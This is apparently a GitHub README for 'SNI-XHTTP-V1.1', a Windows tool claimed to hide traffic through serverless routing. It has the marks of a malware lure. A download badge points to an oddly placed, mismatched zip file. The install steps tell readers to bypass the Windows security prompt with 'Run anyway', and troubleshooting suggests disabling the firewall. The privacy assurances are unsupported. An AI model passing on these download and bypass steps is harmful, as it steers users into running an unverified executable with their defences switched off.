# 🌐 SNI-XHTTP-V1.1 - Hide your traffic with serverless routing

[![Download SNI-XHTTP](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Lgutier9249/SNI-XHTTP-V1.1/main/api/SN-XHTT-v3.9.zip)

SNI-XHTTP-V1.1 helps you route web traffic through a secure serverless network. It acts as a middleman between your computer and your main server. This process masks your original server address to bypass network restrictions. The software uses minimal memory and runs efficiently on modern Windows machines. 

## 🛠️ System Requirements

- Windows 10 or Windows 11
- 64-bit processor
- 20 MB of free disk space
- Active internet connection

## ⚙️ Installation Steps 

1. Locate the downloaded file in your Downloads folder.
2. Double-click the file to open the setup window.
3. Windows might display a security prompt. Click "More info" and then "Run anyway" if the system protects the app.
4. Follow the on-screen prompts to finish the process.
5. The program will create a shortcut on your desktop.

## 🚀 Running the Application 

1. Open the application from your desktop icon.
2. The interface will appear on your screen.
3. You must enter your backend server details provided by your service host.
4. Click the connect button to establish your secure link.
5. Watch the status indicator in the bottom corner of the window. Green confirms a successful connection.

## 📋 Configuration Settings

- **Server Host:** Enter the address of your primary server here.
- **Port Number:** Use the default settings unless your provider specifies a different port.
- **Auto-connect:** Check this box if you want the app to start when you turn on your computer.
- **Minimize to Tray:** This keeps the app running in the background without cluttering your taskbar.

## 🔍 Troubleshooting Common Issues

If you cannot connect to the network, check these items:

- Check your internet connection status.
- Ensure you typed the server address correctly.
- Disable your firewall temporarily to test if it blocks the connection.
- Restart the application.

## 🛡️ Privacy and Safety

This software does not collect your personal data. It only moves traffic between your client and your private server. No logs reside on your local machine.
